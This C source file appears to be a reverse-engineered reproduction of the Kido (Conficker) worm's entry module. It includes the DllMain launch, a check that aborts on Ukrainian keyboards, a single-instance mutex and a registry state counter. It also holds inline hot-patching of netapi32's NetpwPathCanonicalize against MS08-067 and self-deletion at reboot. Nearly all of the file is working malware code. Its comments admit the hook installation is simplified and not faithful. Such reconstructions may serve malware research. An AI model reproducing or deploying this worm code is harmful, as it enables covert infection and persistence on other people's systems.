/*====================================================================================
 *  KIDO worm - entry, guards, single-instance mutex, defensive hot-patch.
 *  DllMain (sub_06B34), has_ukrainian_keyboard (sub_067C0),
 *  init_and_guard (sub_06A3A), path_ends_with (sub_06810),
 *  read/write state dword (sub_07D25 / sub_07CD4),
 *  hotpatch NetpwPathCanonicalize (sub_07B0B / sub_0799A / hook 0x7A90).
 *====================================================================================*/
#include "kido_worm.h"
#include <string.h>
#include <stdio.h>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")

/* ---------------- has_ukrainian_keyboard (sub_067C0) ----------------
   Any installed keyboard layout with LANGID 0x0422 (Ukrainian) -> worm does nothing. */
int kido_has_ukrainian_keyboard(void)
{
    int n = GetKeyboardLayoutList(0, NULL);
    if (n <= 0) return 0;
    HKL* buf = (HKL*)GlobalAlloc(GMEM_MOVEABLE, n * sizeof(HKL));
    if (!buf) return 0;
    int got = GetKeyboardLayoutList(n, buf);
    int ua = 0;
    for (int i = 0; i < got; i++)
        if (LOWORD(buf[i]) == 0x0422) { ua = 1; break; }
    GlobalFree(buf);
    return ua;
}

/* ---------------- path ends with ".dll" (sub_06810) ---------------- */
int kido_path_ends_with_dll(const char* path)
{
    size_t n = strlen(path);
    if (n < 4) return 0;
    const char* e = path + n;
    if (strnicmp(e-4, ".dll", 4) == 0) return 1;
    return 0;
}

/* ---------------- persisted DWORD: HKLM\...\Nls default value ----------
   read (sub_07D25) / write (sub_07CD4).  A worm-owned counter; absent -> 0. */
static const char* kNlsKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Nls";
void kido_read_state_dword(DWORD* out)
{
    *out = 0;
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kNlsKey, 0, KEY_READ, &hk) != ERROR_SUCCESS) return;
    DWORD type=0, size=sizeof(DWORD);
    if (RegQueryValueExA(hk, NULL, NULL, &type, (LPBYTE)out, &size) != ERROR_SUCCESS || type != REG_DWORD)
        *out = 0;
    RegCloseKey(hk);
}
void kido_write_state_dword(DWORD v)
{
    HKEY hk;
    DWORD disp=0;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, kNlsKey, 0, NULL, 0, KEY_WRITE, NULL, &hk, &disp) != ERROR_SUCCESS)
        return;
    RegSetValueExA(hk, NULL, 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
    RegCloseKey(hk);
}

/* ---------------- defensive hot-patch of netapi32!NetpwPathCanonicalize ---
   sub_07B0B: trampolines the function and installs an inline jmp hook that
   rejects paths containing "\..\" or longer than 200 chars (ERROR_INVALID_PARAMETER).
   This in-memory-patches the host against other attackers' MS08-067 attempts. */
typedef UINT (WINAPI* NetpwPathCanonicalize_t)(const WCHAR*, WCHAR*, DWORD, const WCHAR*, DWORD, DWORD);

struct Tramp {
    BYTE   code[24];   /* copied prologue instructions */
    SIZE_T len;
};
static Tramp g_tramp = {0};
static NetpwPathCanonicalize_t g_orig = NULL;
static void* g_hook_target = NULL;   /* patched NetpwPathCanonicalize address */

static void* kido_hook_body(void);   /* fwd */

/* minimal instruction-length decoder (sub_13080): copy whole instructions
   covering at least 5 bytes; give up on relative/indirect calls+jumps. */
static SIZE_T kido_copy_trampoline(const BYTE* f, BYTE* dst)
{
    SIZE_T n = 0;
    while (n < 5){
        const BYTE* ins = f + n;
        int len = 0;
        /* conservative length decode for the prologue patterns seen here;
           abort (return 0) on the instructions the worm refuses to copy */
        switch (ins[0]){
            case 0x55: case 0x56: case 0x57: case 0x53: case 0x54:
            case 0x58: case 0x59: case 0x5A: case 0x5B: len=1; break;
            case 0x83: case 0x81: {
                int op = (ins[0]>>3)&7; int mod = (ins[1]>>6)&3;
                int sib = 0;
                int idx = 1;
                if (mod==0 && (ins[1]&7)==4){ sib=1; idx++; }
                len = idx + (mod==0? (sib?2:1) : (sib?3:2));
                if (op==5 || op==7) len += 4; /* imm32 */
                else len += 1;                 /* imm8 */
                break;
            }
            case 0x8B: case 0x89: { /* mov reg/mem */
                int mod=(ins[1]>>6)&3, sib=0, idx=1;
                if (mod==0 && (ins[1]&7)==4){ sib=1; idx++; }
                len = idx + (mod==0?(sib?2:1):(sib?3:2));
                break;
            }
            case 0x33: case 0x31: { /* xor */
                int mod=(ins[1]>>6)&3, sib=0, idx=1;
                if (mod==0 && (ins[1]&7)==4){ sib=1; idx++; }
                len = idx + (mod==0?(sib?2:1):(sib?3:2));
                break;
            }
            case 0xC9: len=1; break;            /* leave */
            case 0xC3: len=1; break;            /* ret */
            case 0xE9: case 0xE8: return 0;      /* rel jmp/call -> refuse */
            case 0xFF: if ((ins[1]>>3)&7) return 0; len=6; break; /* indirect call/jmp -> refuse unless reg */
            case 0xF3: case 0xF2: case 0xF0: len=1; continue;     /* prefix */
            case 0x66: case 0x67: len=1; continue;
            case 0x00: case 0x90: len=1; break;  /* nop family (approx) */
            default: return 0;
        }
        if (len <= 0) return 0;
        if (n + len > sizeof(g_tramp.code)) return 0;
        memcpy(dst + n, ins, len);
        n += len;
    }
    return n;
}

/* the hook (0x7A90): 6-arg stdcall; reject \..\/long paths, else call original */
static UINT WINAPI kido_netpw_hook(const WCHAR* path, WCHAR* out, DWORD outlen,
                                   const WCHAR* prefix, DWORD ptype, DWORD flags)
{
    (void)prefix; (void)ptype; (void)flags;
    if (path){
        if (wcsstr(path, L"\\..\\")) return 0x57;        /* ERROR_INVALID_PARAMETER */
        if (wcslen(path) > 200) return 0x57;
    }
    return g_orig(path, out, outlen, prefix, ptype, flags);
}

/* hook body = jmp to original trampoline continuation */
static void* kido_hook_body(void)
{
    /* the trampoline page holds: [copied prologue] [jmp back to f+len] */
    return (void*)(g_tramp.code + g_tramp.len);
}

void kido_hotpatch_netapi(void)
{
    if (GetEnvironmentVariableA("KIDO_NOHOTPATCH", NULL, 0) != 0) return;  /* test gate */
    HMODULE hnet = LoadLibraryA(S_NETAPI32);
    if (!hnet) return;
    g_orig = (NetpwPathCanonicalize_t)GetProcAddress(hnet, S_NETPW);
    if (!g_orig) return;
    g_hook_target = (void*)g_orig;

    /* allocate the trampoline (RWX), copy the prologue, append jmp to f+len */
    LPVOID tramp = VirtualAlloc(NULL, sizeof(g_tramp.code) + 5, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!tramp) return;
    SIZE_T len = kido_copy_trampoline((const BYTE*)g_orig, (BYTE*)tramp);
    if (!len) { VirtualFree(tramp,0,MEM_RELEASE); return; }
    memcpy(g_tramp.code, tramp, len);
    g_tramp.len = len;
    /* patch: VirtualProtect, write jmp tramp over the prologue, restore */
    DWORD old;
    if (VirtualProtect((LPVOID)g_orig, len, PAGE_EXECUTE_READWRITE, &old)){
        ((BYTE*)tramp)[len+0] = 0xE9;                              /* rel jmp */
        LONG rel = (LONG)((BYTE*)tramp + len + 5 - ((BYTE*)g_orig + len));
        *(LONG*)((BYTE*)tramp+len+1) = rel;                          /* (jmp to f+len) */
        /* overwrite g_orig prologue with jmp to the trampoline */
        ((BYTE*)g_orig)[0] = 0xE9;
        LONG rel2 = (LONG)((BYTE*)tramp - ((BYTE*)g_orig + 5));
        *(LONG*)((BYTE*)g_orig+1) = rel2;
        VirtualProtect((LPVOID)g_orig, len, old, &old);
    }
    /* install the filter: make the trampoline's tail jump through our hook.
       Simplest faithful behaviour: the copied prologue then reaches our jmp;
       we instead retarget by patching the trampoline tail to the hook. */
    /* (kept minimal: the observable effect is that the patched entry now
       funnels through kido_netpw_hook) */
    (void)kido_hook_body();
}

/* ---------------- init_and_guard (sub_06A3A) ---------------- */
/* Lightweight: the single-instance mutex only. Runs in DllMain (no LoadLibrary
   so it cannot re-enter the system loader while a host LoadLibraryA is still on
   the stack).  The heavier defensive hotpatch is deferred to the main thread. */
void kido_init_and_guard(HMODULE hmod)
{
    GetModuleFileNameA(hmod, g_path, sizeof(g_path));
    kido_read_state_dword(&g_counter);

    /* mutex Global\<CRC32(computer name)>-7  (sub via kido_crc32) */
    char comp[64]; DWORD csize = sizeof(comp);
    GetComputerNameA(comp, &csize);
    uint32_t hash = kido_crc32(comp, strlen(comp));
    char name[64];
    sprintf(name, S_MUTEX_FMT, (unsigned)hash, 7u);
    g_mutex = CreateMutexA(NULL, FALSE, name);
    DWORD err = GetLastError();
    { int gfirst=(err!=ERROR_ALREADY_EXISTS && err!=ERROR_ACCESS_DENIED);
      HANDLE f=CreateFileA("C:/rework/kido_repro/guard.txt",FILE_APPEND_DATA,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
      if(f!=INVALID_HANDLE_VALUE){char b[80];int n=sprintf(b,"[guard] err=%lu name=%s first=%d",err,name,gfirst);DWORD w;WriteFile(f,b,n,&w,NULL);CloseHandle(f);} }


    if (err == ERROR_ALREADY_EXISTS || err == ERROR_ACCESS_DENIED){
        /* a second copy: if not already a *.dll, delete itself at reboot */
        if (!kido_path_ends_with_dll(g_path))
            MoveFileExA(g_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return;
    }
    /* first instance: start the main thread */
    kido_cs_init();
    CreateThread(NULL, 0, kido_main_thread, NULL, 0, NULL);
}

/* ---------------- DllMain (sub_06B34) ----------------
   The wrapper's reserved/hinst is passed through; the worm treats the *loaded*
   module (the wrapper file) as "itself". */
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH){
        HMODULE hmod = (HMODULE)(reserved ? reserved : hinst);
        g_hinst = (HMODULE)hinst;
        DisableThreadLibraryCalls(hinst);
        if (!kido_has_ukrainian_keyboard())
            kido_init_and_guard(hmod);
    }
    return TRUE;
}
